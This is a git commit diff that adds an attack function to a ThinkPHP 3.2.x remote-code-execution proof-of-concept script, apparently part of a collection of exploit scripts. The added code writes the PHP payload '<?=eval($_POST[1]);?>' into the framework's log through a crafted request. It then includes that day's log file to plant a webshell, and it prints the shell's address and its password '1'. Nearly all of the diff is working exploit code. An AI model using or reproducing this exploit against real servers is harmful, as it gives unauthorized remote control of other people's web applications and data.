da04d7a6a8457a274da817e3df093347b39c7b0a
tr0uble_mAker <71172892+tr0uble-mAker@users.noreply.github.com>
2021-12-29 17:31:49 +0800

    Update thinkphp32x_rce.py

--- pocs/framework/thinkphp/thinkphp32x_rce.py
+++ pocs/framework/thinkphp/thinkphp32x_rce.py
@@ -46,3 +46,45 @@ Upgrade-Insecure-Requests: 1
     except:
         return relsult
 
+
+def attack(url):
+    try:
+        payload1 = b'''
+        GET /index.php?m=--><?=eval($_POST[1]);?> HTTP/1.1
+        Host: localhost:8080
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-GB,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
+        Upgrade-Insecure-Requests: 1
+
+            '''.replace(b'\n', b'\r\n')
+        oH = urlparse(url)
+        a = oH.netloc.split(':')
+        port = 80
+        if 2 == len(a):
+            port = a[1]
+        elif 'https' in oH.scheme:
+            port = 443
+        host = a[0]
+        print('[+] 正在上传webshell.................')
+        with socket.create_connection((host, port), timeout=5) as conn:
+            conn.send(payload1)
+            req1 = conn.recv(10240).decode()
+            today = (date.today() + timedelta()).strftime("%y_%m_%d")
+            payload2 = urllib.parse.urljoin(url, 'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(today))
+            req2 = requests.get(payload2, timeout=3)
+        if req2.status_code == 200:
+            print('[*] webshell上传成功!')
+            print('[*] Webshell地址: {0}'.format(payload2))
+            print('[*] 密码: 1')
+            print('[+] have a good day!')
+            return True
+        else:
+            print('[-] webshell上传失败请检查是否存在漏洞?')
+            return False
+    except:
+        return False
+
